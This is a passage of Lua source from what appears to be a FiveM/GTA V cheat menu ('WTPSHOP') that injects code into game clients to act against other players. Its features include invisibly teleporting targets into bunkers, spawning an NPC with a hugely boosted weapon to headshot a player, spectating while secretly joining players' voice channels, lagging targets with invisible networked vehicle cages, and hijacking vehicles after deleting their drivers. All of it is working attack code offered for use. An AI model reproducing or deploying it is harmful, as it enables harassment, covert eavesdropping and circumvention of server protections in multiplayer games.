                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)

                                            WTPSHOP.Native(Wait, 300)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)

                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the player into Agency Bunker.", 3000)
                                elseif value == "Record A Bunker" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = -1010.791, -64.487, -100.403

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)

                                            WTPSHOP.Native(Wait, 300)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)

                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the player into Record A Bunker.", 3000)
                                elseif value == "Meth Bunker" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = 1009.630, -3197.849, -38.996

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)

                                            WTPSHOP.Native(Wait, 300)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)

                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the player into Meth Bunker.", 3000)
                                elseif value == "After Hours Bunker" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = -1604.664, -3012.583, -78.000

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)

                                            WTPSHOP.Native(Wait, 300)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)

                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the player into After Hours Bunker.", 3000)
                                elseif value == "Tunnel Bunker" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = 1256.11, 4796.48, -39.05

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)

                                            WTPSHOP.Native(Wait, 300)

                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)

                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the player into Tunnel Bunker.", 3000)
                                elseif value == "Waypoint" then
                                    if not IsWaypointActive() then
                                        self:Notify("error", "WTPSHOP", "You must set a waypoint on the map first!", 3000)
                                        return
                                    end

                                    local waypointBlip = GetFirstBlipInfoId(8)
                                    local waypointCoords = GetBlipInfoIdCoord(waypointBlip)

                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local myPed = PlayerPedId()
                                            local sid = %d
                                            local player = GetPlayerFromServerId(sid)
                                            local targetPed = GetPlayerPed(player)

                                            if DoesEntityExist(targetPed) then
                                                local originalCoords = GetEntityCoords(myPed)
                                                local destX, destY = %f, %f
                                                local targetCoords = GetEntityCoords(targetPed)
                                                local foundGround, groundZ = GetGroundZFor_3dCoord(destX, destY, 800.0, 0)
                                                if not foundGround then groundZ = 0.0 end

                                                WTPSHOP.Native(ClearPedTasksImmediately, myPed)
                                                WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                                WTPSHOP.Native(SetEntityCollision, myPed, false, false)
                                                WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false)
                                                WTPSHOP.Native(Wait, 250)
                                                WTPSHOP.Native(ExecuteCommand, "carry")
                                                WTPSHOP.Native(Wait, 250)
                                                WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, destX, destY, groundZ + 2.0, false, false, false)
                                                WTPSHOP.Native(Wait, 250)
                                                WTPSHOP.Native(ExecuteCommand, "carry")
                                                WTPSHOP.Native(Wait, 250)
                                                WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                                WTPSHOP.Native(SetEntityCollision, myPed, true, true)
                                                WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            end
                                        ]], playerId, waypointCoords.x, waypointCoords.y))
                                    end
                                    self:Notify("success", "WTPSHOP", "Sent players to your Waypoint!", 3000)
                                elseif value == "Bring Target" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        ApiRasclat.SafeRes(string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTPSHOP.Native(DoesEntityExist, targetPed) then return end

                                            WTPSHOP.Native(SetEntityVisible, myPed, false, false)
                                            WTPSHOP.Native(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTPSHOP.Native(Wait, 50)

                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(Wait, 100)

                                            WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTPSHOP.Native(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTPSHOP.Native(NetworkRequestControlOfEntity, targetPed)
                                                WTPSHOP.Native(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, true)
                                            WTPSHOP.Native(Wait, 300)
                                            WTPSHOP.Native(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTPSHOP.Native(SetEntityVisible, myPed, true, false)
                                            WTPSHOP.Native(ResetEntityAlpha, myPed)
                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(ExecuteCommand, cmd)
                                            WTPSHOP.Native(DetachEntity, targetPed, true, true)
                                            WTPSHOP.Native(DetachEntity, myPed, true, true)
                                            WTPSHOP.Native(ClearPedTasksImmediately, targetPed)
                                            WTPSHOP.Native(ClearPedTasksImmediately, myPed)
                                            WTPSHOP.Native(Wait, 200)
                                            WTPSHOP.Native(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTPSHOP", "Successfully bring the target to you.", 3000)
                                end
                            end
                        },
                        { type = "scrollable", label = "Kill Player NPC", scrollType = "onEnter", value = 1, values = {"Pistol", "Pistol.50", "Sniper Rifle"},
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, isSelected in pairs(CPlayers) do
                                    if isSelected then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local weaponMap = {
                                    ["Pistol"] = "weapon_pistol",
                                    ["Pistol.50"] = "weapon_pistol50",
                                    ["Sniper Rifle"] = "weapon_sniperrifle"
                                }
                                local weaponHash = weaponMap[value]
                                local targetID = tonumber(targetPlayers[1])
                                executeCode('any', ([[
                                    local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                    local npcModel = "mp_m_freemode_01"
                                    local theWeapon = "%s"
                                    local coords = GetEntityCoords(targetPed)

                                    RequestModel(npcModel)
                                    while not HasModelLoaded(npcModel) do
                                        Wait(0)
                                    end

                                    local npcPed = CreatePed(4, GetHashKey(npcModel), coords.x + 10, coords.y, coords.z, 0.0, true, true)

                                    if DoesEntityExist(npcPed) then
                                        SetPedCanRagdoll(npcPed, false)
                                        FreezeEntityPosition(npcPed, true)
                                        GiveWeaponToPed(npcPed, GetHashKey(theWeapon), 250, false, true)
                                        SetWeaponDamageModifier(GetHashKey(theWeapon), 1000.0)
                                        SetPedCombatAttributes(npcPed, 5, true)
                                        SetPedCombatRange(npcPed, 2)
                                        SetPedCombatMovement(npcPed, 3)
                                        TaskCombatPed(npcPed, playerPed, 0, 16)
                                        local headBone = GetPedBoneIndex(targetPed, 31086)
                                        local targetCoords = GetPedBoneCoords(targetPed, headBone, 0.0, 0.0, 0.0)
                                        TaskShootAtCoord(npcPed, targetCoords.x, targetCoords.y, targetCoords.z, 1000, GetHashKey("FIRING_PATTERN_SINGLE_SHOT"))
                                        Wait(1000)
                                        DeleteEntity(npcPed)
                                    end

                                    SetModelAsNoLongerNeeded(GetHashKey(npcModel))
                                ]]):format(targetID, weaponHash))
                                self:Notify("success", "WTPSHOP", "Successfully Kill Player NPC", 3000)
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        { type = "checkbox", label = "Spectate Player", checked = false, desc = 'This will attempt to Spectate the player',
                            onSelect = function(checked)
                                local targetPlayers = {}
                                for serverId, isSelected in pairs(CPlayers) do
                                    if isSelected then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end
                                local targetID = tonumber(targetPlayers[1])
                                if checked then
                                    ApiRasclat.SafeRes(string.format([[
                                        _G.__SpectateRunning = true
                                        local tgtPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                        local cam = WTPSHOP.Native(CreateCam, "DEFAULT_SCRIPTED_CAMERA", true)
                                        _G.__SpectateCam = cam
                                        WTPSHOP.Native(SetCamActive, cam, true)
                                        WTPSHOP.Native(RenderScriptCams, true, false, 0, true, false)
                                        local function enableSpectateVoice()
                                            local players = GetActivePlayers()
                                            for i = 1, #players do
                                                local ply = players[i]
                                                local sid = GetPlayerServerId(ply)
                                                if sid ~= GetPlayerServerId(PlayerId()) then
                                                    local ch = MumbleGetVoiceChannelFromServerId(sid)
                                                    if ch ~= -1 then
                                                        MumbleAddVoiceChannelListen(ch)
                                                    end
                                                end
                                            end
                                        end

                                        enableSpectateVoice()

                                        WTPSHOP.Native(CreateThread, function()
                                            local distanceBehind = 3.0
                                            local baseHeight = 1.0

                                            while _G.__SpectateRunning and tgtPed and DoesEntityExist(tgtPed) do
                                                Wait(1)
                                                local coords = GetEntityCoords(tgtPed)
                                                WTPSHOP.Native(RequestAdditionalCollisionAtCoord, coords.x, coords.y, coords.z)
                                                WTPSHOP.Native(SetFocusPosAndVel, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)
                                                local camRot = WTPSHOP.Native(GetGameplayCamRot, 0)
                                                local pitch = -math.rad(camRot.x)
                                                local heading = math.rad(camRot.z)

                                                local offsetX = -math.sin(heading) * math.cos(pitch) * distanceBehind
                                                local offsetY =  math.cos(heading) * math.cos(pitch) * distanceBehind
                                                local offsetZ =  math.sin(pitch) * distanceBehind

                                                local camX = coords.x + offsetX
                                                local camY = coords.y + offsetY
                                                local camZ = coords.z + baseHeight + offsetZ

                                                WTPSHOP.Native(SetCamCoord, cam, camX, camY, camZ)
                                                WTPSHOP.Native(PointCamAtEntity, cam, tgtPed, 0.0, 0.0, 0.8, true)

                                                tgtPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                            end

                                            ClearFocus()
                                            WTPSHOP.Native(RenderScriptCams, false, false, 0, true, false)
                                            WTPSHOP.Native(DestroyCam, cam, false)
                                            _G.__SpectateCam = nil
                                        end)
                                    ]], targetID, targetID))
                                else
                                    ApiRasclat.SafeRes([[
                                        _G.__SpectateRunning = false
                                        if _G.__SpectateCam then
                                            ClearFocus()
                                            WTPSHOP.Native(RenderScriptCams, false, false, 0, true, false)
                                            WTPSHOP.Native(DestroyCam, _G.__SpectateCam, false)
                                            _G.__SpectateCam = nil
                                        end

                                        local players = GetActivePlayers()
                                        for i = 1, #players do
                                            local ply = players[i]
                                            local sid = GetPlayerServerId(ply)
                                            if sid ~= GetPlayerServerId(PlayerId()) then
                                                local ch = MumbleGetVoiceChannelFromServerId(sid)
                                                if ch ~= -1 then
                                                    MumbleRemoveVoiceChannelListen(ch)
                                                end
                                            end
                                        end
                                    ]])
                                end
                            end
                        },
                        { type = "checkbox", label = "Bug Player", desc = "This will attemp to lag the player", checked = false,
                            onSelect = function(checked)
                                local targetPlayers = {}
                                for serverId, checkeds in pairs(CPlayers) do
                                    if checkeds then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetServerId = targetPlayers[1]
                                if checked then
                                    ApiRasclat.SafeRes(string.format([[
                                        _G.cageObjs = {}
                                        _G.cageFollow = true

                                        local targetPlayer = GetPlayerFromServerId(%d)
                                        if not targetPlayer or targetPlayer == -1 then return end

                                        local targetPed = GetPlayerPed(targetPlayer)
                                        if not DoesEntityExist(targetPed) then return end

                                        local model = joaat("adder")

                                        RequestModel(model)
                                        while not HasModelLoaded(model) do Wait(0) end

                                        local offsets = {
                                            vector3( 1.6,  0.0, 0.0),
                                            vector3(-1.6,  0.0, 0.0),
                                            vector3( 0.0,  1.6, 0.0),
                                            vector3( 0.0, -1.6, 0.0),
                                            vector3( 1.1,  1.1, 0.0),
                                            vector3(-1.1,  1.1, 0.0),
                                            vector3( 1.1, -1.1, 0.0),
                                            vector3(-1.1, -1.1, 0.0),
                                        }

                                        for _, off in ipairs(offsets) do
                                            local obj = CreateObject(
                                                model,
                                                0.0, 0.0, 0.0,
                                                true, true, false
                                            )

                                            NetworkRequestControlOfEntity(obj)
                                            local t = GetGameTimer() + 2000
                                            while not NetworkHasControlOfEntity(obj) and GetGameTimer() < t do
                                                Wait(0)
                                            end

                                            local netId = NetworkGetNetworkIdFromEntity(obj)
                                            SetNetworkIdExistsOnAllMachines(netId, true)
                                            SetNetworkIdCanMigrate(netId, false)

                                            SetEntityCollision(obj, true, true)
                                            SetEntityAlpha(obj, 0, false)
                                            SetEntityVisible(obj, false, false)
                                            SetEntityInvincible(obj, true)
                                            FreezeEntityPosition(obj, true)

                                            table.insert(_G.cageObjs, { entity = obj, offset = off })
                                        end

                                        WTPSHOP.Thread(function()
                                            while _G.cageFollow do
                                                if not DoesEntityExist(targetPed) then break end

                                                local baseCoords = GetEntityCoords(targetPed)
                                                local heading = GetEntityHeading(targetPed)

                                                for _, data in ipairs(_G.cageObjs) do
                                                    if DoesEntityExist(data.entity) then
                                                        local world = GetOffsetFromEntityInWorldCoords(
                                                            targetPed,
                                                            data.offset.x,
                                                            data.offset.y,
                                                            -1.0
                                                        )
                                                        SetEntityCoordsNoOffset(
                                                            data.entity,
                                                            world.x,
                                                            world.y,
                                                            world.z,
                                                            false, false, false
                                                        )
                                                        SetEntityHeading(data.entity, heading)
                                                    end
                                                end

                                                Wait(0)
                                            end
                                        end)

                                        SetModelAsNoLongerNeeded(model)
                                    ]], targetServerId))
                                else
                                    ApiRasclat.SafeRes([[
                                        _G.cageFollow = false
                                        if not _G.cageObjs then return end

                                        for _, data in ipairs(_G.cageObjs) do
                                            if DoesEntityExist(data.entity) then
                                                NetworkRequestControlOfEntity(data.entity)
                                                local t = GetGameTimer() + 2000
                                                while not NetworkHasControlOfEntity(data.entity) and GetGameTimer() < t do
                                                    Wait(0)
                                                end
                                                DeleteEntity(data.entity)
                                            end
                                        end

                                        _G.cageObjs = nil
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Bug Player V2",
                            desc = "Bug target extreme camera lag and movement lock.",
                            checked = false,
                            onSelect = function(checked)
                                local targetPlayers = {}
                                for serverId, checkeds in pairs(CPlayers) do
                                    if checkeds then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetId = targetPlayers[1]
                                if checked then
                                    ApiRasclat.SafeRes(string.format([[
                                        _G.TitanBugActive = true
                                        _G.TitanObjs = {}

                                        local targetServerId = %d
                                        local propModel = joaat("adder")

                                        RequestModel(propModel)
                                        while not HasModelLoaded(propModel) do Wait(0) end

                                        local pId = GetPlayerFromServerId(targetServerId)
                                        local targetPed = GetPlayerPed(pId)

                                        local positions = {
                                            vector3(1.2, 0, 0), vector3(-1.2, 0, 0),
                                            vector3(0, 1.2, 0), vector3(0, -1.2, 0)
                                        }

                                        for _, pos in ipairs(positions) do
                                            local obj = CreateObject(propModel, GetEntityCoords(targetPed), true, true, false)
                                            SetEntityVisible(obj, false, false)
                                            SetEntityAlpha(obj, 0, false)
                                            SetEntityCollision(obj, true, true)
                                            SetActivateObjectPhysicsAsSoonAsItIsUnfrozen(obj, true)
                                            table.insert(_G.TitanObjs, {ent = obj, off = pos})
                                        end

                                        WTPSHOP.Thread(function()
                                            local rotation = 0
                                            while _G.TitanBugActive do
                                                local pIdLoop = GetPlayerFromServerId(targetServerId)
                                                local ped = GetPlayerPed(pIdLoop)
                                                
                                                if not DoesEntityExist(ped) then break end
                                                
                                                rotation = rotation + 45 
                                                local jitter = (math.random(-20, 20) / 100)

                                                for _, data in ipairs(_G.TitanObjs) do
                                                    if DoesEntityExist(data.ent) then
                                                        local worldPos = GetOffsetFromEntityInWorldCoords(ped, data.off.x + jitter, data.off.y + jitter, -0.5)
                                                        
                                                        SetEntityCoordsNoOffset(data.ent, worldPos.x, worldPos.y, worldPos.z, false, false, false)
                                                        SetEntityRotation(data.ent, rotation, rotation, rotation, 2, true)
                                                        
                                                        ApplyForceToEntity(data.ent, 1, 0, 0, 0.1, 0, 0, 0, 0, true, true, true, false, true)
                                                    end
                                                end
                                                Wait(0)
                                            end
                                        end)
                                    ]], targetId))
                                    self:Notify("success", "Bug Player V2", "Extreme Bug Injected!", 3000)
                                else
                                    ApiRasclat.SafeRes([[
                                        _G.TitanBugActive = false
                                        if _G.TitanObjs then
                                            for _, data in ipairs(_G.TitanObjs) do
                                                if DoesEntityExist(data.ent) then DeleteEntity(data.ent) end
                                            end
                                        end
                                        _G.TitanObjs = nil
                                    ]])
                                    self:Notify("info", "Bug Player V2", "Bug Cleaned", 3000)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Fly Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                local targetPlayers = {}
                                for serverId, checkeds in pairs(CPlayers) do
                                    if checkeds then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetId = targetPlayers[1]
                                if checked then
                                    ApiRasclat.SafeRes(string.format([[
                                        _G.FlyVehicle = true
                                        local targetServerId = %d
                                        local player = PlayerPedId()

                                        if not _G.OriginalCoords then
                                            _G.OriginalCoords = GetEntityCoords(player)
                                        end

                                        local function RequestControl(entity, timeoutMs)
                                            timeoutMs = timeoutMs or 600
                                            local start = GetGameTimer()
                                            while (GetGameTimer() - start) < timeoutMs do
                                                if NetworkHasControlOfEntity(entity) then return true end
                                                NetworkRequestControlOfEntity(entity)
                                                Wait(0)
                                            end
                                            return NetworkHasControlOfEntity(entity)
                                        end

                                        local function HijackDriverSeat(vehicle)
                                            if not DoesEntityExist(vehicle) then return nil end
                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                                            
                                            SetEntityVisible(player, false, false)
                                            SetEntityAlpha(player, 0, false)
                                            RequestControl(vehicle, 250)

                                            if driver ~= 0 and driver ~= player then
                                                RequestControl(driver, 250)
                                                DeletePed(driver)
                                                Wait(50)
                                            end

                                            TaskWarpPedIntoVehicle(player, vehicle, -1)
                                            Wait(50)
                                            return vehicle
                                        end

                                        local function GetCameraDirection()
                                            local rot = GetGameplayCamRot(2)
                                            local pitch, yaw = math.rad(rot.x), math.rad(rot.z)
                                            local cosPitch = math.cos(pitch)
                                            return vector3(-math.sin(yaw) * cosPitch, math.cos(yaw) * cosPitch, math.sin(pitch))
                                        end

                                        local function FlyWhereYouLook(vehicle, speed)
                                            if not DoesEntityExist(vehicle) then return end
                                            RequestControl(vehicle, 50)
                                            local direction = GetCameraDirection()
                                            SetEntityVelocity(vehicle, direction.x * speed, direction.y * speed, direction.z * speed)
                                            local rot = GetEntityRotation(vehicle, 2)
                                            SetEntityRotation(vehicle, 0.0, 0.0, rot.z, 2, true)
                                        end

                                        WTPSHOP.Thread(function()
                                            while _G.FlyVehicle do
                                                local targetPlayer = GetPlayerFromServerId(targetServerId)
                                                if targetPlayer ~= -1 then
                                                    local targetPed = GetPlayerPed(targetPlayer)
                                                    if DoesEntityExist(targetPed) and IsPedInAnyVehicle(targetPed, false) then
                                                        local targetVehicle = GetVehiclePedIsUsing(targetPed)
                                                        if DoesEntityExist(targetVehicle) then
                                                            local hijackedVehicle = HijackDriverSeat(targetVehicle)
                                                            if hijackedVehicle then
                                                                local flySpeed = 50.0
                                                                while _G.FlyVehicle and IsPedInVehicle(player, hijackedVehicle, false) do
                                                                    FlyWhereYouLook(hijackedVehicle, flySpeed)
                                                                    Wait(0)
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                                Wait(200)
                                            end
                                        end)
                                    ]], targetId))
